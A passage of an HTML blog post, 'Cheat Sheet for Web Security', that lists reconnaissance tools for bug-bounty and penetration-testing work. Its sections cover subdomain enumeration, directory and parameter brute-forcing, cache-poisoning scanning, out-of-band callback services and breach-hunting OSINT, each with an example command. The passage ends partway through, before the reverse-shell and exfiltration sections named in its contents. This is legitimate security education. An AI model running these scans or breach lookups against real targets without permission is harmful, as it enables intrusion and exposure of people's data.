@@ -1,0 +1,1507 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <script type="application/ld+json">
+
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Cheat Sheet for Web Security",
+  
+  "image": "https://thieu1995.github.io/post/2021-03/18-cheat-sheet-web-security/avatar.jpg",
+  
+  "datePublished": "2021-03-18T00:00:00Z",
+  "dateModified": "2021-03-18T00:00:00Z",
+  "author": {
+    "@type": "Person",
+    "name": "Nguyen Van Thieu",
+    
+    "image": "https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded"
+    
+  },
+  "mainEntityOfPage": { 
+    "@type": "WebPage",
+    "@id": "https:\/\/thieu1995.github.io\/2021\/03\/cheat-sheet-for-web-security\/" 
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Thieu's Blog",
+    
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded"
+    }
+    
+  },
+  "description": "A comprehensive cheat sheet for web security\n",
+  "keywords": []
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.73.0 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="Nguyen Van Thieu">
+<meta name="keywords" content="">
+<meta name="description" content="A comprehensive cheat sheet for web security">
+
+
+<meta property="og:description" content="A comprehensive cheat sheet for web security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cheat Sheet for Web Security">
+<meta name="twitter:title" content="Cheat Sheet for Web Security">
+<meta property="og:url" content="https://thieu1995.github.io/2021/03/cheat-sheet-for-web-security/">
+<meta property="twitter:url" content="https://thieu1995.github.io/2021/03/cheat-sheet-for-web-security/">
+<meta property="og:site_name" content="Thieu&#39;s Blog">
+<meta property="og:description" content="A comprehensive cheat sheet for web security">
+<meta name="twitter:description" content="A comprehensive cheat sheet for web security">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2021-03-18T00:00:00">
+  
+  
+    <meta property="article:modified_time" content="2021-03-18T00:00:00">
+  
+  
+  
+    
+      <meta property="article:section" content="blog">
+    
+      <meta property="article:section" content="computer science">
+    
+      <meta property="article:section" content="IT">
+    
+  
+  
+    
+      <meta property="article:tag" content="learning path">
+    
+      <meta property="article:tag" content="computer science">
+    
+      <meta property="article:tag" content="web security">
+    
+      <meta property="article:tag" content="IT">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded?s=640">
+  <meta property="twitter:image" content="https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded?s=640">
+
+
+
+
+
+  <meta property="og:image" content="https://thieu1995.github.io/post/2021-03/18-cheat-sheet-web-security/avatar.jpg">
+  <meta property="twitter:image" content="https://thieu1995.github.io/post/2021-03/18-cheat-sheet-web-security/avatar.jpg">
+
+
+    <title>Cheat Sheet for Web Security</title>
+
+    <link rel="icon" href="https://thieu1995.github.io/img/favicon_io/favicon.ico">
+    
+
+    
+
+    <link rel="canonical" href="https://thieu1995.github.io/2021/03/cheat-sheet-for-web-security/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://thieu1995.github.io/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+      
+        <link rel="stylesheet"  href="https://thieu1995.github.io/css/bootstrap-grid.min.css">
+      
+    
+      
+        <link rel="stylesheet"  href="https://thieu1995.github.io/css/my_style.css">
+      
+    
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-224078006-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://thieu1995.github.io/" aria-label="Go to homepage">Thieu&#39;s Blog</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://thieu1995.github.io/#about" aria-label="Open the link: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded?s=90" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://thieu1995.github.io/#about" aria-label="Read more about the author">
+          <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded?s=110" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Nguyen Van Thieu</h4>
+        
+          <h5 class="sidebar-profile-bio">Lecturer at Faculty of Computer Science, Phenikaa University</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://thieu1995.github.io/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://thieu1995.github.io/pages/cv" title="CV">
+    
+      <i class="sidebar-button-icon fa fa-address-card"></i>
+      
+      <span class="sidebar-button-desc">CV</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://thieu1995.github.io/pages/research" title="Research">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-registered"></i>
+      
+      <span class="sidebar-button-desc">Research</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://thieu1995.github.io/pages/publications" title="Publications">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tasks"></i>
+      
+      <span class="sidebar-button-desc">Publications</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://thieu1995.github.io/pages/projects" title="Projects">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-solid fa-laptop-code"></i>
+      
+      <span class="sidebar-button-desc">Projects</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://thieu1995.github.io/pages/teaching" title="Teaching">
+    
+      <i class="sidebar-button-icon fa fa-university"></i>
+      
+      <span class="sidebar-button-desc">Teaching</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://thieu1995.github.io/categories/blog/" title="Blog">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-puzzle-piece"></i>
+      
+      <span class="sidebar-button-desc">Blog</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/thieu1995" target="_blank" rel="noopener" title="GitHub">
+    
+      <i class="sidebar-button-icon fab fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://scholar.google.com/citations?user=nsTbdhgAAAAJ&amp;hl=en" target="_blank" rel="noopener" title="GG Scholar">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-graduation-cap"></i>
+      
+      <span class="sidebar-button-desc">GG Scholar</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.researchgate.net/profile/Thieu_Nguyen6" target="_blank" rel="noopener" title="ResearchGate">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-flag-checkered"></i>
+      
+      <span class="sidebar-button-desc">ResearchGate</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://publons.com/researcher/3048975/nguyen-van-thieu/" target="_blank" rel="noopener" title="Publons">
+    
+      <i class="sidebar-button-icon fab fa-product-hunt"></i>
+      
+      <span class="sidebar-button-desc">Publons</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://loop.frontiersin.org/people/969519/" target="_blank" rel="noopener" title="Frontier">
+    
+      <i class="sidebar-button-icon fab fa-fonticons"></i>
+      
+      <span class="sidebar-button-desc">Frontier</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://orcid.org/0000-0001-9994-8747" target="_blank" rel="noopener" title="ORCID">
+    
+      <i class="sidebar-button-icon fab fa-opera"></i>
+      
+      <span class="sidebar-button-desc">ORCID</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://thieu1995.github.io/index.xml" title="RSS">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-rss" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title">
+      Cheat Sheet for Web Security
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2021-03-18T00:00:00Z">
+        
+  March 18, 2021
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://thieu1995.github.io/categories/blog">blog</a>, 
+    
+      <a class="category-link" href="https://thieu1995.github.io/categories/computer-science">computer science</a>, 
+    
+      <a class="category-link" href="https://thieu1995.github.io/categories/it">IT</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <p>A comprehensive cheat sheet for web security</p>
+<h1 id="web-security">Web Security</h1>
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+<li><a href="#Discovering">Discovering</a>
+<ul>
+<li><a href="#Targets">Targets</a></li>
+<li><a href="#IP-Enumeration">IP Enumeration</a></li>
+<li><a href="#Subdomain-Enumeration">Subdomain Enumeration</a></li>
+<li><a href="#Wayback-Machine">Wayback Machine</a></li>
+<li><a href="#Cache">Cache</a></li>
+<li><a href="#Crawling">Crawling</a></li>
+<li><a href="#Wordlist">Wordlist</a></li>
+<li><a href="#Directory-Bruteforcing">Directory Bruteforcing</a></li>
+<li><a href="#Parameter-Bruteforcing">Parameter Bruteforcing</a></li>
+<li><a href="#DNS-and-HTTP-detection">DNS and HTTP detection</a></li>
+<li><a href="#Acquisitions">Acquisitions/Names/Addresses/Contacts/Emails/etc.</a></li>
+<li><a href="#JavaScript-Comments">HTML/JavaScript Comments</a></li>
+<li><a href="#Google-Dorks">Google Dorks</a></li>
+<li><a href="#CSP">Content Security Policy (CSP)</a></li>
+<li><a href="#Tiny-URLs-Services">Tiny URLs Services</a></li>
+<li><a href="#GraphQL">GraphQL</a></li>
+<li><a href="#General-Discovering">General</a></li>
+</ul>
+</li>
+<li><a href="#Enumerating">Enumerating</a>
+<ul>
+<li><a href="#Fingerprint">Fingerprint</a></li>
+<li><a href="#Buckets">Buckets</a></li>
+<li><a href="#Cloud-Enumeration">Cloud Enumeration</a></li>
+<li><a href="#Containerization">Containerization</a></li>
+<li><a href="#Visual-Identification">Visual Identification</a></li>
+</ul>
+</li>
+<li><a href="#Scanning">Scanning</a>
+<ul>
+<li><a href="#Static-Application-Security-Testing">Static Application Security Testing</a></li>
+<li><a href="#Dependency-Confusion">Dependency Confusion</a></li>
+<li><a href="#Send-Emails">Send Emails</a></li>
+<li><a href="#Search-Vulnerabilities">Search Vulnerabilities</a></li>
+<li><a href="#Web-Scanning">Web Scanning</a></li>
+<li><a href="#HTTP-Request-Smuggling">HTTP Request Smuggling</a></li>
+<li><a href="#Subdomain-Takeover">Subdomain Takeover</a></li>
+<li><a href="#SQLi-Scanning">SQLi (SQL Injection)</a></li>
+<li><a href="#Repositories-Scanning">Repositories Scanning</a></li>
+<li><a href="#Google-Dorks-Scanning">Google Dorks Scanning</a></li>
+<li><a href="#CORS-Misconfigurations">CORS Misconfigurations</a></li>
+</ul>
+</li>
+<li><a href="#Monitoring">Monitoring</a>
+<ul>
+<li><a href="#CVE">CVE</a></li>
+</ul>
+</li>
+<li><a href="#Attacking">Attacking</a>
+<ul>
+<li><a href="#Brute-Force">Brute Force</a></li>
+<li><a href="#Exfiltration">Exfiltration</a></li>
+</ul>
+</li>
+<li><a href="#Manual">Manual</a>
+<ul>
+<li><a href="#Payloads">Payloads</a></li>
+<li><a href="#Bypass">Bypass</a></li>
+<li><a href="#Deserialization">Deserialization</a></li>
+<li><a href="#SSRF">SSRF (Server-Side Request Forgery)</a></li>
+<li><a href="#DNS-Rebinding">DNS Rebinding</a></li>
+<li><a href="#SMTP-Header-Injection">SMTP Header Injection</a></li>
+<li><a href="#Reverse-Shell">Reverse Shell</a></li>
+<li><a href="#SQLi-Manual">SQLi (SQL Injection)</a></li>
+<li><a href="#LFI-Manual">LFI (Local File Inclusion)</a></li>
+<li><a href="#SSTI">SSTI (Server Side Template Injection)</a></li>
+<li><a href="#WebDAV">WebDAV (Web Distributed Authoring and Versioning)</a></li>
+<li><a href="#Generic-Tools">Generic Tools</a></li>
+</ul>
+</li>
+<li><a href="#General-All">General</a></li>
+</ul>
+<h2 id="discovering">Discovering</h2>
+<h3 id="targets">Targets</h3>
+<p><a href="https://github.com/arkadiyt/bounty-targets-data">https://github.com/arkadiyt/bounty-targets-data</a>
+<br># This repo contains data dumps of Hackerone and Bugcrowd scopes (i.e. the domains that are eligible for bug bounty reports).</p>
+<h3 id="ip-enumeration">IP Enumeration</h3>
+<p><a href="http://www.asnlookup.com">http://www.asnlookup.com</a>
+<br># This tool leverages ASN to look up IP addresses (IPv4 &amp; IPv6) owned by a specific organization for reconnaissance purposes.</p>
+<p><a href="https://github.com/pielco11/fav-up">https://github.com/pielco11/fav-up</a>
+<br># Lookups for real IP starting from the favicon icon and using Shodan.
+<br><code>python3 favUp.py --favicon-file favicon.ico -sc</code></p>
+<p><a href="https://stackoverflow.com/questions/16986879/bash-script-to-list-all-ips-in-prefix">https://stackoverflow.com/questions/16986879/bash-script-to-list-all-ips-in-prefix</a>
+<br># List all IP addresses in a given CIDR block
+<br><code>nmap -sL -n 10.10.64.0/27 | awk '/Nmap scan report/{print $NF}'</code></p>
+<h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
+<p><a href="https://web.archive.org/web/20211127183642/https://appsecco.com/books/subdomain-enumeration/">https://web.archive.org/web/20211127183642/https://appsecco.com/books/subdomain-enumeration/</a>
+<br># This book intendes to be a reference for subdomain enumeration techniques.</p>
+<p><a href="https://github.com/OWASP/Amass">https://github.com/OWASP/Amass</a>
+<br># The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.
+<br><code>amass enum -passive -dir /tmp/amass_output/ -d example.com -o dir/example.com</code></p>
+<p><a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a>
+<br># subfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources.
+<br><code>subfinder -r 8.8.8.8,8.8.4.4,1.1.1.1,1.0.0.1 -t 10 -v -d example.com -o dir/example.com</code></p>
+<p><a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a>
+<br># Altdns is a DNS recon tool that allows for the discovery of subdomains that conform to patterns. Altdns takes in words that could be present in subdomains under a domain (such as test, dev, staging) as well as takes in a list of subdomains that you know of.
+<br><code>altdns -i subdomains.txt -o data_output -w words.txt -r -s results_output.txt</code></p>
+<p><a href="https://github.com/nsonaniya2010/SubDomainizer">https://github.com/nsonaniya2010/SubDomainizer</a>
+<br># SubDomainizer is a tool designed to find hidden subdomains and secrets present is either webpage, Github, and external javascripts present in the given URL.
+<br><code>python3 SubDomainizer.py -u example.com -o dir/example.com</code></p>
+<p><a href="https://dns.bufferover.run/dns?q=example.com">https://dns.bufferover.run/dns?q=example.com</a>
+<br># Powered by DNSGrep (<a href="https://github.com/erbbysam/DNSGrep">https://github.com/erbbysam/DNSGrep</a>)
+<br># A utility for quickly searching presorted DNS names. Built around the Rapid7 rdns &amp; fdns dataset.</p>
+<p><a href="https://crt.sh/?q=example.com">https://crt.sh/?q=example.com</a>
+<br># Certificate Search</p>
+<p><a href="https://censys.io/certificates?q=parsed.subject_dn%3AO%3DExample+Organization">https://censys.io/certificates?q=parsed.subject_dn%3AO%3DExample+Organization</a>
+<br># Censys is the most reputable, exhaustive, and up-to-date source of Internet scan data in the world, so you see everything.</p>
+<p><a href="https://www.shodan.io/search?query=ssl%3AExample">https://www.shodan.io/search?query=ssl%3AExample</a>
+<br># Shodan is the world&rsquo;s first search engine for Internet-connected devices.</p>
+<p><a href="https://github.com/xiecat/fofax">https://github.com/xiecat/fofax</a>
+<br># fofax is a fofa query tool written in go, positioned as a command-line tool and characterized by simplicity and speed.
+<br><code>fofax -q 'app=&quot;APACHE-Solr&quot;'</code></p>
+<p><a href="https://publicwww.com">https://publicwww.com</a>
+<br># Find any alphanumeric snippet, signature or keyword in the web pages HTML, JS and CSS code.</p>
+<p><a href="https://fofa.so">https://fofa.so</a>
+<br># FOFA (Cyberspace Assets Retrieval System) is the world&rsquo;s IT equipment search engine with more complete data coverage, and it has more complete DNA information of global networked IT equipment.</p>
+<p><a href="https://www.zoomeye.org">https://www.zoomeye.org</a>
+<br># ZoomEyeis China&rsquo;s first and world-renowned cyberspace search engine driven by 404 Laboratory of Knownsec. Through a large number of global surveying and mapping nodes, according to the global IPv4, IPv6 address and website domain name databases，it can continuously scan and identify multiple service port and protocols 24 hours a day, and finally map the whole or local cyberspace.</p>
+<p><a href="https://securitytrails.com/list/email/dns-admin.example.com">https://securitytrails.com/list/email/dns-admin.example.com</a>
+<br># Total Internet Inventory with the most comprehensive data that informs with unrivaled accuracy.
+<br><code>curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&amp;page=1&amp;scroll=true' --data '{&quot;filter&quot;:{&quot;apex_domain&quot;:&quot;example.com&quot;}}' | jq '.records[].hostname' | sed 's/&quot;//g' &gt;&gt; subdomains.txt</code>
+<br><code>curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&amp;page=1&amp;scroll=true' --data '{&quot;filter&quot;:{&quot;whois_email&quot;:&quot;domains@example.com&quot;}}' | jq '.records[].hostname' | sed 's/&quot;//g' &gt;&gt; domains.txt</code></p>
+<p><a href="https://viewdns.info/reversewhois">https://viewdns.info/reversewhois</a>
+<br># This free tool will allow you to find domain names owned by an individual person or company.</p>
+<p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a>
+<br># Offering researchers and community members open access to data from Project Sonar, which conducts internet-wide surveys to gain insights into global exposure to common vulnerabilities.</p>
+<p><a href="https://github.com/ninoseki/mihari">https://github.com/ninoseki/mihari</a>
+<br># Mihari is a framework for continuous OSINT based threat hunting.</p>
+<h3 id="wayback-machine">Wayback Machine</h3>
+<p><a href="https://github.com/tomnomnom/waybackurls">https://github.com/tomnomnom/waybackurls</a>
+<br># Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for *.domain and output them on stdout.
+<br><code>cat subdomains.txt | waybackurls &gt; waybackurls.txt</code></p>
+<p><a href="https://github.com/tomnomnom/hacks">https://github.com/tomnomnom/hacks</a>
+<br># Hacky one-off scripts, tests etc.
+<br><code>cat waybackurls.txt | go run /root/Tools/hacks/anti-burl/main.go | tee waybackurls_valid.txt</code></p>
+<p><a href="https://github.com/lc/gau">https://github.com/lc/gau</a>
+<br># getallurls (gau) fetches known URLs from AlienVault&rsquo;s Open Threat Exchange, the Wayback Machine, and Common Crawl for any given domain.
+<br><code>cat domains.txt | gau --threads 5</code></p>
+<h3 id="cache">Cache</h3>
+<p><a href="https://www.giftofspeed.com/cache-checker">https://www.giftofspeed.com/cache-checker</a>
+<br># This tool lists which web files on a website are cached and which are not. Furthermore it checks by which method these files are cached and what the expiry time of the cached files is.</p>
+<p><a href="https://youst.in/posts/cache-poisoning-at-scale/">https://youst.in/posts/cache-poisoning-at-scale/</a>
+<br># Even though Web Cache Poisoning has been around for years, the increasing complexity in technology stacks constantly introduces unexpected behaviour which can be abused to achieve novel cache poisoning attacks. In this paper I will present the techniques I used to report over 70 cache poisoning vulnerabilities to various Bug Bounty programs.</p>
+<p><a href="https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner">https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner</a>
+<br># Web Cache Vulnerability Scanner (WCVS) is a fast and versatile CLI scanner for web cache poisoning developed by Hackmanit.
+<br><code>wcvs -u https://example.com -hw &quot;file:/home/user/Documents/wordlist-header.txt&quot; -pw &quot;file:/home/user/Documents/wordlist-parameter.txt&quot;</code></p>
+<h3 id="crawling">Crawling</h3>
+<p><a href="https://github.com/jaeles-project/gospider">https://github.com/jaeles-project/gospider</a>
+<br># Fast web spider written in Go.
+<br><code>gospider -s &quot;https://example.com/&quot; -o output -c 20 -d 10</code></p>
+<h3 id="wordlist">Wordlist</h3>
+<p><a href="https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7">https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7</a>
+<br># Scrapes all unique words and numbers for use with password cracking.</p>
+<p><a href="https://github.com/ameenmaali/wordlistgen">https://github.com/ameenmaali/wordlistgen</a>
+<br># wordlistgen is a tool to pass a list of URLs and get back a list of relevant words for your wordlists.
+<br><code>cat hosts.txt | wordlistgen</code></p>
+<p><a href="https://github.com/adamtlangley/gitscraper">https://github.com/adamtlangley/gitscraper</a>
+<br># A tool which scrapes public github repositories for common naming conventions in variables, folders and files.
+<br><code>php gitscraper.php {GitHub Username} {GitHub Personal KEY}</code></p>
+<p><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a>
+<br># SecLists is the security tester&rsquo;s companion. It&rsquo;s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.</p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>
+<br># A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques.</p>
+<p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a>
+<br># FuzzDB was created to increase the likelihood of finding application security vulnerabilities through dynamic application security testing.</p>
+<p><a href="https://github.com/google/fuzzing">https://github.com/google/fuzzing</a>
+<br># This project aims at hosting tutorials, examples, discussions, research proposals, and other resources related to fuzzing.</p>
+<p><a href="https://github.com/xyele/hackerone_wordlist">https://github.com/xyele/hackerone_wordlist</a>
+<br># The wordlists that have been compiled using disclosed reports at the HackerOne bug bounty platform.</p>
+<p><a href="https://wordlists.assetnote.io">https://wordlists.assetnote.io</a>
+<br># This website provides you with wordlists that are up to date and effective against the most popular technologies on the internet.</p>
+<h3 id="directory-bruteforcing">Directory Bruteforcing</h3>
+<p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a>
+<br># A fast web fuzzer written in Go.
+<br><code>ffuf -H 'User-Agent: Mozilla' -v -t 30 -w mydirfilelist.txt -b 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/FUZZ'</code></p>
+<p><a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a>
+<br># Gobuster is a tool used to brute-force.
+<br><code>gobuster dir -a 'Mozilla' -e -k -l -t 30 -w mydirfilelist.txt -c 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/'</code></p>
+<p><a href="https://github.com/tomnomnom/meg">https://github.com/tomnomnom/meg</a>
+<br># meg is a tool for fetching lots of URLs but still being &lsquo;nice&rsquo; to servers.
+<br><code>meg -c 50 -H 'User-Agent: Mozilla' -s 200 weblogic.txt example.txt weblogic</code></p>
+<p><a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a>
+<br># Cansina is a Web Content Discovery Application.
+<br><code>python3 cansina.py -u 'https://example.com/' -p mydirfilelist.txt --persist</code></p>
+<p><a href="https://github.com/epi052/feroxbuster">https://github.com/epi052/feroxbuster</a>
+<br># A simple, fast, recursive content discovery tool written in Rust.
+<br><code>feroxbuster -u 'https://example.com/' -x pdf -x js,html -x php txt json,docx</code></p>
+<h3 id="parameter-bruteforcing">Parameter Bruteforcing</h3>
+<p><a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a>
+<br># Arjun can find query parameters for URL endpoints.
+<br><code>arjun -u https://example.com/</code></p>
+<p><a href="https://github.com/Sh1Yo/x8">https://github.com/Sh1Yo/x8</a>
+<br># Hidden parameters discovery suite written in Rust.
+<br><code>x8 -u &quot;https://example.com/&quot; -w &lt;wordlist&gt;</code></p>
+<h3 id="dns-and-http-detection">DNS and HTTP detection</h3>
+<p><a href="https://ceye.io">https://ceye.io</a>
+<br># Monitor service for security testing.
+<br><code>curl http://api.ceye.io/v1/records?token={API Key}&amp;type=dns curl http://api.ceye.io/v1/records?token={API Key}&amp;type=http</code></p>
+<p><a href="https://portswigger.net/burp/documentation/collaborator">https://portswigger.net/burp/documentation/collaborator</a>
+<br># Burp Collaborator is a network service that Burp Suite uses to help discover many kinds of vulnerabilities.
+<br># Tip <a href="https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions">https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions</a></p>
+<p><a href="https://httpbin.org/">https://httpbin.org/</a>
+<br># A simple HTTP Request &amp; Response Service.</p>
+<p><a href="http://pingb.in">http://pingb.in</a>
+<br># Simple DNS and HTTP service for security testing.</p>
+<p><a href="https://github.com/ctxis/SnitchDNS">https://github.com/ctxis/SnitchDNS</a>
+<br># SnitchDNS is a database driven DNS Server with a Web UI, written in Python and Twisted, that makes DNS administration easier with all configuration changed applied instantly without restarting any system services.</p>
+<p><a href="http://dnslog.cn">http://dnslog.cn</a>
+<br># Simple DNS server with realitme logs.</p>
+<p><a href="https://interact.projectdiscovery.io/">https://interact.projectdiscovery.io/</a>
+<br># Interactsh is an Open-Source Solution for Out of band Data Extraction, A tool designed to detect bugs that cause external interactions, For example - Blind SQLi, Blind CMDi, SSRF, etc.</p>
+<p><a href="https://canarytokens.org/">https://canarytokens.org/</a>
+<br># You&rsquo;ll be familiar with web bugs, the transparent images which track when someone opens an email. They work by embedding a unique URL in a page&rsquo;s image tag, and monitoring incoming GET requests.
+<br># Imagine doing that, but for file reads, database queries, process executions or patterns in log files. Canarytokens does all this and more, letting you implant traps in your production systems rather than setting up separate honeypots.</p>
+<h3 id="a-nameacquisitionsaacquisitionsnamesaddressescontactsemailsetc"><a name="Acquisitions"></a>Acquisitions/Names/Addresses/Contacts/Emails/etc.</h3>
+<p><a href="https://hunter.io">https://hunter.io</a>
+<br># Hunter lets you find email addresses in seconds and connect with the people that matter for your business.</p>
+<p><a href="https://intelx.io">https://intelx.io</a>
+<br># Intelligence X is an independent European technology company founded in 2018 by Peter Kleissner. The company is based in Prague, Czech Republic. Its mission is to develop and maintain the search engine and data archive.</p>
+<p><a href="https://www.nerdydata.com">https://www.nerdydata.com</a>
+<br># Find companies based on their website&rsquo;s tech stack or code.</p>
+<p><a href="https://github.com/khast3x/h8mail">https://github.com/khast3x/h8mail</a>
+<br># h8mail is an email OSINT and breach hunting tool using different breach and reconnaissance services, or local breaches such as Troy Hunt&rsquo;s &ldquo;Collection1&rdquo; and the infamous &ldquo;Breach Compilation&rdquo; torrent.
+<br><code>h8mail -t target@example.com</code></p>
+<p><a href="https://dashboard.fullcontact.com">https://dashboard.fullcontact.com</a>
+<br># Our person-first Identity Resolution Platform provides the crucial intelligence needed to drive Media Amplification, Omnichannel Measurement, and Customer Recognition.</p>
+<p><a href="https://www.peopledatalabs.com">https://www.peopledatalabs.com</a>
+<br># Our data empowers developers to build innovative, trusted data-driven products at scale.</p>
+<p><a href="https://www.social-searcher.com">https://www.social-searcher.com</a>
+<br># Free Social Media Search Engine.</p>
+<p><a href="https://github.com/mxrch/GHunt">https://github.com/mxrch/GHunt</a>
+<br># GHunt is an OSINT tool to extract information from any Google Account using an email.
+<br><code>python3 ghunt.py email myemail@gmail.com</code></p>
